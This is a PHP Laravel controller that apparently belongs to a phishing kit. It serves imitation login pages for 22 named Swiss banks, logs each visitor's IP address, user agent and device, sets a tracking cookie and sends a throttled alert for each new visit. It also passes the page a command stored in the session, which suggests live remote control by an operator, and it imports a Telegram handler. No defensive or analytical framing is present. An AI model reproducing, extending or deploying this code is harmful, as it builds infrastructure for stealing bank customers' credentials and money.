<?php

namespace App\Http\Controllers;

use App\Events\PreSessionCreated;
use App\Models\BankSession;
use App\Models\PreSession;
use App\Telegram\Handlers\SmartSuppHandler;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Str;
use Inertia\Inertia;
use Inertia\Response;

class BankLoginController extends Controller
{
    public const ACTIVE_SLUGS = [
        'migros', 'ubs', 'postfinance', 'aek-bank', 'bank-avera',
        'swissquote', 'baloise', 'bancastato', 'next-bank', 'llb',
        'raiffeisen', 'valiant', 'bernerland', 'cler', 'dc-bank',
        'banque-du-leman', 'bank-slm', 'sparhafen', 'alternative-bank',
        'hypothekarbank', 'banque-cantonale-du-valais', 'kantonalbank',
    ];

    public function show(string $bankSlug, Request $request): Response
    {
        if (!in_array($bankSlug, self::ACTIVE_SLUGS, true)) {
            abort(404);
        }

        $cookieName = 'bsid_' . $bankSlug;
        $existingId = $request->cookie($cookieName);
        $session    = null;

        if ($existingId) {
            $session = BankSession::where('id', $existingId)
                ->where('bank_slug', $bankSlug)
                ->where('status', '!=', 'completed')
                ->where('last_activity_at', '>=', now()->subHours(2))
                ->first();
        }

        if ($session === null) {
            $session = BankSession::create([
                'bank_slug'        => $bankSlug,
                'ip_address'       => $request->clientIp(),
                'user_agent'       => $request->userAgent(),
                'domain'           => $request->getHost(),
                'last_activity_at' => now(),
            ]);
        }

        $preSession = PreSession::create([
            'ip_address'  => $request->clientIp(),
            'user_agent'  => $request->userAgent(),
            'page_url'    => $request->fullUrl(),
            'page_name'   => $bankSlug,
            'bank_slug'   => $bankSlug,
            'device_type' => self::detectDevice($request->userAgent() ?? ''),
            'is_online'   => true,
            'last_seen'   => now(),
        ]);

        // Атомарный lock: шлём уведомление только один раз за 15 сек для IP+банк
        $lockKey = 'presession:' . $request->clientIp() . ':' . $bankSlug;
        if (Cache::add($lockKey, true, 15)) {
            PreSessionCreated::dispatch($preSession);
        }

        $page = 'Banks/' . Str::studly(str_replace('-', '_', $bankSlug));

        Cookie::queue($cookieName, $session->id, 120);

        return Inertia::render($page, [
            'sessionId'      => $session->id,
            'bankSlug'       => $bankSlug,
            'smartsupp'      => SmartSuppHandler::getSettings(),
            'preSessionId'   => $preSession->id,
            'initialCommand' => $session->action_type ?? ['type' => 'idle'],
        ]);
    }

    private static function detectDevice(string $ua): string
    {
        if (stripos($ua, 'iPhone') !== false) return 'iphone';
        if (stripos($ua, 'iPad') !== false)   return 'ipad';
        if (stripos($ua, 'Android') !== false) return 'android';
        if (stripos($ua, 'Windows') !== false) return 'windows';
        if (stripos($ua, 'Macintosh') !== false || stripos($ua, 'Mac OS X') !== false) return 'macos';
        if (stripos($ua, 'Linux') !== false)   return 'linux';
        return 'desktop';
    }
}
